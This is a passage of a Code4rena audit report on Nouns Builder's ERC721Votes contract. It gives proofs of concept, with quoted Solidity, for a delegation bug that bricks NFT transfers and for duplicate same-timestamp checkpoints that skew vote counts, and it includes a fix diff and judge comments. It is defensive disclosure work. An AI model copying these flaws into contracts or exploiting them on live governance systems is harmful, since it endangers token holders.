width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Suppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the previous delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Store the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer voting weight from the previous delegate to the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>_moveDelegateVotes() will set her votes to <code>0</code> as <code>_from == Alice</code> and <code>prevTotalVotes = _amount = balanceOf(Alice)</code> (as _afterTokenTransfer() incremented Alice’s vote balance on each mint to her):</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If voting weight is being transferred:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token mint:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Get the sender&#39;s number of checkpoints</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numCheckpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Used to store the sender&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// If this isn&#39;t the sender&#39;s first checkpoint: Get their previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Update their voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span></code></pre>\n<p>After that her votes in the checkpoint become zero. She will not be able to transfer the NFT as <code>_afterTokenTransfer</code> will revert on <code>_moveDelegateVotes</code>’s attempt to move <code>1</code> vote from <code>Alice</code> to <code>_to</code>, while <code>checkpoints[Alice][nCheckpoints - 1].votes</code> is <code>0</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer 1 vote from the sender to the recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The root issue is _afterTokenTransfer() dealing with Alice instead of Alice’s delegate.</p>\n<p>Consider including delegates() call as a fix:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer 1 vote from the sender to the recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-       </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk11\">delegates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">), </span><span class=\"mtk11\">delegates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>As <code>delegates(address(0)) == address(0)</code> the burning/minting flow will persist:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice The delegate for an account</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _account The account address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delegates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">current</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">current</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">_account</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">current</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373\">tbtstl (Nouns Builder) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373#issuecomment-1258703067\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to the overlapping system handling delegation and balances, it is possible for a user to brick their own <code>transferability</code> of their tokens.</p>\n<p>This POC shows that any delegation will cause the issues as when dealing with a transfer, their currently zero-vote-balance will further be deducted instead of the delegated votes they have.</p>\n<p>Because the finding shows a broken invariant, in that any delegation will brick transfers, as the invariants offered by ERC721Votes have been broken; I believe High Severity to be appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-multiple-vote-checkpoints-per-block-will-lead-to-incorrect-vote-accounting\" style=\"position:relative;\"><a href=\"#h-03-multiple-vote-checkpoints-per-block-will-lead-to-incorrect-vote-accounting\" aria-label=\"h 03 multiple vote checkpoints per block will lead to incorrect vote accounting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185\">[H-03] Multiple vote checkpoints per block will lead to incorrect vote accounting</a></h2>\n<p><em>Submitted by berndartmueller, also found by 0x52, 0xSky, bin2chen, cccz, Chom, davidbrai, elprofesor, izhuer, m9800, PwnPatrol, and rvierdiiev</em></p>\n<p>Voting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of <code>ERC721Votes</code> creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Checkpoints with the same <code>timestamp</code> will cause issues within the <code>ERC721Votes.getPastVotes(..)</code> function and will return incorrect votes for a given <code>_timestamp</code>.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253\">lib/token/ERC721Votes.sol#L252-L253</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Records a checkpoint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _account The account address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _id The checkpoint id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _prevTotalVotes The account&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _newTotalVotes The account&#39;s new voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_prevTotalVotes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newTotalVotes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get the pointer to store the checkpoint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Checkpoint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">checkpoint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Record the updated voting weight and current time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">checkpoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votes</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newTotalVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">checkpoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint64</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateVotesChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_newTotalVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong>Consider the following example and the votes checkpoint snapshots:</strong></p>\n<p><em>Note: Bob owns a smart contract used to interact with the protocol</em></p>\n<p><strong>Transaction 0:</strong> Bob’s smart contract receives 1 NFT through minting (1 NFT equals 1 vote)</p>\n<table>\n<thead>\n<tr>\n<th>Checkpoint Index</th>\n<th>Timestamp</th>\n<th>Votes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Transaction 1:</strong> Bob’s smart contract receives one more NFT through minting</p>\n<table>\n<thead>\n<tr>\n<th>Checkpoint Index</th>\n<th>Timestamp</th>\n<th>Votes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Transaction 1:</strong> Within the same transaction 1, Bob’s smart-contract delegates 2 votes to Alice</p>\n<table>\n<thead>\n<tr>\n<th>Checkpoint Index</th>\n<th>Timestamp</th>\n<th>Votes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>2</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>0</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Transaction 1:</strong> Again within the same transaction 1, Bob’s smart contract decides to reverse the delegation and self-delegates</p>\n<table>\n<thead>\n<tr>\n<th>Checkpoint Index</th>\n<th>Timestamp</th>\n<th>Votes</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>2</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>3</td>\n<td>1</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Transaction 1:</strong> Bob’s smart contract buys one more NFT</p>\n<table>\n<thead>\n<tr>\n<th>Checkpoint 